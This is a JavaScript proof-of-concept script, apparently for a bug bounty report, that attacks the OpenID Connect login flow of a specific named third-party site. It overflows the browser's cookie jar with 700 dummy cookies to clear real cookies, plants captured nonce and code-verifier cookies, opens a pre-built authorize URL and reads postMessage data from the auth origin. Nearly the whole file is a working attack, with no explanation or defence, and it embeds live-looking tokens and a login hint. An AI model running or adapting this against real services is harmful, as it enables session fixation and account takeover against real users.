// PUT HERE YOUR VARS

var loginurl="https://auth.externalbeta2.emaplan.com/oauth2/default/v1/authorize?client_id=0oaedsgzjxZlGjbOX4h7&redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema%2Fauthorization-code%2Fcallback&response_type=code&scope=openid%20profile&code_challenge=LcshtDg967YfbcQm7Ju3NJ06A38oR6bjNMeoJGGLsC4&code_challenge_method=S256&state=OpenIdConnect.AuthenticationProperties%3D2jtQv582h7gFKRUgFiuQMjZY2fpEgbSpQ2ToOA4NpLx2nRRodJlXijdClsqXMH0wvV34NAI81apmI1RhD1z7DlfmEdTeXl6C6XP8suFikyIuKJ0VX9BjvoFpXa_JDJasA_yrdrtT_DPMFSSbN3MtkiSvi04B4iifEahnNuxSljqpX5h0NFE0ir22RwVy4tdFQEhSf7oKNpTHbExd6FM2LmvscNB15WreOpTx6RMtsJw3oBjy1vdTzuu7NwozMrqcUQln16Ni93xdtxKJ4MBiMUY6-_M0Esfq56FfgSTzuOyZnAwtRhiJkV-vKuFxL93Ch05MlEfnADtRlaKi1iKQ0-s9_oOutd6QWF64Dy_PiFYGbK46CNt-z75modBUVx1fBaxUOhIK-0hEPPHUU-CgaoIbV82_-W6BsjLVGnB256aKj71ox4-xD_iIEDIclrQ5VXgSjZdeCsz9mOzWqzo8Zv5H2uUX_QeeVckJ7x2em9RbbnHLVj5lC_AdQLMyykbjcjG0w0LpRsYXJlBFYwLEphZfIoDKtmgLQ-cR-5FnSAJ0vFjKy98CRydyoGamjZfii1JuGa3YkbVnhJYJggPVwMpT6VtT5mOvompQjBnEUiH90GxvYnfKW1KzCgmGy6Y7XfoT-CoL05zRBfVH_lZjRldr0Avt_hBfUB13duQppz5e4_GR9oRjgt6QZaHWm7Ywf_I2EANSluw_g65qNk3Dxu_MCgOMG4XBxiwbJWUEXFV2TdFIlbuJ3pTGeRb24ZWSEoF8c0CbeajSSLp3c-Qz_xQTzbRgW5tocwWaj38zNOLSvL-cG8cKtEFnllnQXs8hf5ymM0Bp4IJRpsdKUrIMxhv7ez2bhQyvBfYQszWD8bWifNrMXEcLZ-kvo0YQZShCN5a99pbJiM3yiy-_S6C6xTy6k5jcBWyZYhRk-ScKSHou5RlFXmIx6Sfx0LXjEADsacEhPHM9vTk19EbVBSg0wB78a7Pp4d_sYgB0hnGre_EvJnlz5O9p3rstv4hPbSG_UTheAO-ym1j_5QWxeuxRjHV_yPsObHBDHP2SsHPg7aL0GMA3Z2yBip_jNWt8kJrwSRMpQsD9Cfcz46UD3Hrv9i9rDHU1ZJ7Ym8lOlKAPZgTgAj1f87bpZHov3EveHTJ_kI8-bzWpvYpEr0KFgafzYksrald4vZluGiroSJidIV9RcuXZCWUIZvCbtUL_I6QW6sanl08QcNec0lTZWNDKs0yaIQuKAeDktr2uGNXr_E1U0Q-fyNYtjc7EAKes67RKLTAsOdhrZXitH6bcZDYJBaNOmef7Jd8pRl3vIxQ9L36-iz3QsZ-un_WtLPtWim03YYsT5yLWbXkhIRwBCxnve1UzrQ62iKN2Lh-EowSK-Yi8NuVXno0q8Fea1DGBn3J1dFWsL9ce-f1GOqiSOZLcNNIcLA-52ekXgozc6Xsphd9Df1cu2uvmEN1frNm3QVkAadfHkLTXyLnLBszxr6htOevFKwOHpACKtxuzE-n1ZRo_BnQxZRIQLR28Aw8SJrk_BoD1A5zwykMJAd1ex7jrG5URJ4ivC3JyRWB-_uuqLNR6dtdwgLbhoQGrcCoCVSJlwNy9eBoS7e1pD6SNDSWy8ieeVOhza7tTm_1zyShdReQHPdPh7QQ5fZpsiUcEP1D4XP27WsehfXVKY3PSGCJ9dZ9_2K207BdWiyqsEDVgq-1peQaSkfV3eA82uSO0tVGCXLjQz1zzdntErS_CEdjSpGZnxq9jBE_3r3YLqDmxAjvE_1nYw1GNM2KzujaVGI3mzbrE8wbvLGxEfK4FClaiBt6kq3HVMsO8Hrq1hI2WhwYX0ZyqRMSp-jiwHwJDFFTdf2sJ_3Uq8e72qFgYB69NUtUUDxtycle7R4-H8RN4LzWfByl3Ev-s1P75JxiDs-7aVSUwgVwkzmTkkTaQ2PyFQPgER9eZA7F1yvQFloTKdydI0GaqmVuk1XrzyHKIfWOBPCbdIh78jVLEScTWlQjJYFZ081sYI_VUv99d3_0ERyvE1SISGaf1HLmb0RTUDGSDo9nyD_PofPCg3DLsrZb5fg&response_mode=form_post&nonce=638766312167160760.YTFlN2I0ZTMtYTlmNS00MmNhLTlmYjAtOTc2ZTc1ZDVkYjIw&login_hint=H1Client00422&partner=ema&office=ema&logo=partner%2Fdefault%2FFiles%2FImages%2FHeader%2FTopLeftLogo.gif%3Fv%3D1039623088&enable_spi_sso=False&post_logout_redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema&x-client-SKU=ID_NET472&x-client-ver=8.3.0.0";
var openidnonce="OpenIdConnect.nonce.95UhHt2PKTKSOS57lnXpqwUyi9iGk2BZLsG+rS1dphs==SUp5WFNLQVB5bkxwc1M4VTRCLXBhT2h1c29xbkV1R2NTQ2syZzQyWERCYlE4alZZMTJpQzdjU0N2M0dFZk9BaXI3WHNjNzd1ZGZZNnJvQ2pROWpQekxJR0xyRHphX3U1VFdfLS1UNzJEZ1AzcWd2c1Rweld5ajhZRVB6aFpDbTR4QlE3LXlpX21aRFNyTHpkN3g2X2UzV3h6dWZxVlFzTXRfN3ZsdWR0ZFhxMjdaeGNYaDd4UXVmc1JDMG9fSzVBVlpCWENRTkVNNGlJbEVQZFBkQXMzN1Zvajh0WEJLM2N6NVdFU0dGNnhlWQ==";
var openIdcv="OpenIdConnect.cv.oyP35KYVTMbMNVQFryztqfruhytLNRZtWHiDk0iRnpY%3d=b2pDaWgwbHFQcUNqcDJpeGVMNG9ORkxsbDl0TWRYX19vNlZiNTJ5VjNXY1lQMnBGZlZLejdjSVEzM3AzeFN2d3I3RHFFX1B1OUVnSEdrS29Ma1BTNTVxRFliX1dETzhXZUZWVFBEUm96cEFfYmxIajdRMEREUFZMSWItLVVJUzRIY0U3b2xoamx3dk51Yjljc29jZFFB";

function deleteAllCookies() {
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}; Secure`;
    }

    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
}

function executePoC(){
    var x = window.open(loginurl);
    window.addEventListener('message',(e)=>{
        if (e.origin === "https://auth.externalbeta2.emaplan.com"){
            alert(JSON.stringify(e.data));
        }        
    });
}

function setCookies(){
    document.cookie=`${openidnonce}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`
    document.cookie=`${openIdcv}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`;
}

deleteAllCookies();
setCookies();
executePoC();
